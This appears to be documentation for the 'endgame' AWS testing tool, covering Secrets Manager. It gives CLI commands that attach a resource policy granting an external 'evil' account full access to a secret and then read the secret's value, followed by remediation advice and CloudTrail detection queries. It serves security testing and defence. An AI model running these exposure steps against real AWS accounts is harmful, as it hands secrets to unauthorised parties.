# Secrets Manager

* [Steps to Reproduce](#steps-to-reproduce)
* [Exploitation](#exploitation)
* [Remediation](#remediation)
* [Basic Detection](#basic-detection)
* [References](#references)

## Steps to Reproduce

* **Option 1**: To expose the resource using `endgame`, run the following from the victim account:

```bash
export EVIL_PRINCIPAL=arn:aws:iam::999988887777:user/evil

endgame expose --service secretsmanager --name test-resource-exposure
```

* **Option 2**: To expose the resource using AWS CLI, run the following from the victim account:

```bash
export EVIL_PRINCIPAL=arn:aws:iam::999988887777:user/evil
export VICTIM_RESOURCE=arn:aws:secretsmanager:us-east-1:111122223333:secret/test-resource-exposure
export EVIL_POLICY='{"Version": "2012-10-17", "Statement": [{"Sid": "AllowCurrentAccount", "Effect": "Allow", "Principal": {"AWS": "arn:aws:iam::999988887777:user/evil"}, "Action": "secretsmanager:*", "Resource": ["arn:aws:secretsmanager:us-east-1:111122223333:secret/test-resource-exposure"]}]}'

aws secretsmanager put-resource-policy --secret-id --resource-policy $EVIL_POLICY
```

* To view the contents of the exposed resource policy, run the following:

```bash
aws secretsmanager get-resource-policy --secret-id test-resource-exposure
```

* Observe that the contents of the exposed resource policy match the example shown below.

## Example

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "Endgame",
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::999988887777:user/evil"
      },
      "Action": "secretsmanager:*",
      "Resource": [
        "arn:aws:secretsmanager:us-east-1:111122223333:secret/test-resource-exposure"
      ]
    }
  ]
}
```

## Exploitation

* Authenticate to the `evil` account (In this example, `arn:aws:iam::999988887777:user/evil`)

* Run the following command in the victim account:

```bash
export VICTIM_RESOURCE=arn:aws:secretsmanager:us-east-1:111122223333:secret/test-resource-exposure

aws secretsmanager get-secret-value --secret-id $VICTIM_RESOURCE 
```

* Observe that the output resembles the following:

```json
{
  "ARN": "arn:aws:secretsmanager:us-east-1:111122223333:secret/test-resource-exposure",
  "Name": "test-resource-exposure",
  "VersionId": "DOGECOIN",
  "SecretString": "{\n  \"username\":\"doge\",\n  \"password\":\"coin\"\n}\n",
  "VersionStages": [
    "AWSCURRENT"
  ],
  "CreatedDate": 1523477145.713
}
```

## Remediation

* **Leverage Strong Resource-based Policies**: Follow the resource-based policy recommendations in the [Prevention Guide](https://endgame.readthedocs.io/en/latest/prevention/#leverage-strong-resource-based-policies)
* **Trusted Accounts Only**: Ensure that Secrets Manager secrets are only shared with trusted accounts, and that the trusted accounts truly need access to the secret.
* **Ensure access is necessary**: For any trusted accounts that do have access, ensure that the access is absolutely necessary.
* **AWS Access Analyzer**: Leverage AWS Access Analyzer to report on external access to Secrets Manager secrets. See [the AWS Access Analyzer documentation](https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer-resources.html#access-analyzer-secrets-manager) for more details.
* **Restrict access to IAM permissions that could lead to exposure of your Secrets**: Tightly control access to the following IAM actions:
      - [secretsmanager:PutResourcePolicy](https://docs.aws.amazon.com/secretsmanager/latest/apireference/API_PutResourcePolicy.html): _Enables the user to attach a resource policy to a secret._
      - [secretsmanager:GetSecretValue](https://docs.aws.amazon.com/secretsmanager/latest/apireference/API_GetSecretValue.html): _Enables the user to retrieve and decrypt the encrypted data._
      - [secretsmanager:DeleteResourcePolicy](https://docs.aws.amazon.com/secretsmanager/latest/apireference/API_DeleteResourcePolicy.html): _Enables the user to delete the resource policy attached to a secret._
      - [secretsmanager:GetResourcePolicy](https://docs.aws.amazon.com/secretsmanager/latest/apireference/API_GetResourcePolicy.html): _Enables the user to get the resource policy attached to a secret._
      - [secretsmanager:ListSecrets](https://docs.aws.amazon.com/secretsmanager/latest/apireference/API_ListSecrets.html): _Enables the user to list the available secrets._

Also, consider using [Cloudsplaining](https://github.com/salesforce/cloudsplaining/#cloudsplaining) to identify violations of least privilege in IAM policies. This can help limit the IAM principals that have access to the actions that could perform Resource Exposure activities. See the example report [here](https://opensource.salesforce.com/cloudsplaining/)

## Basic Detection
The following CloudWatch Log Insights query will include exposure actions taken by endgame:
```
fields eventTime, eventSource, eventName, userIdentity.arn, userAgent 
| filter eventSource='secretsmanager.amazonaws.com' AND (eventName='PutResourcePolicy' or eventName='DeleteResourcePolicy')
```

The following query detects policy modifications which include the default IOC string:
```
fields eventTime, eventSource, eventName, userIdentity.arn, userAgent 
| filter eventSource='secretsmanager.amazonaws.com' AND (eventName='PutResourcePolicy' and requestParameters.resourcePolicy like 'Endgame')
```

This query assumes that your CloudTrail logs are being sent to CloudWatch and that you have selected the correct log group.

## References

* [aws secretsmanager get-resource-policy](https://docs.aws.amazon.com/cli/latest/reference/secretsmanager/get-resource-policy.html)
* [aws secretsmanager get-secret-value](https://docs.aws.amazon.com/cli/latest/reference/secretsmanager/get-secret-value.html)
* [aws secretsmanager put-resource-policy](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/secretsmanager/put-resource-policy.html)
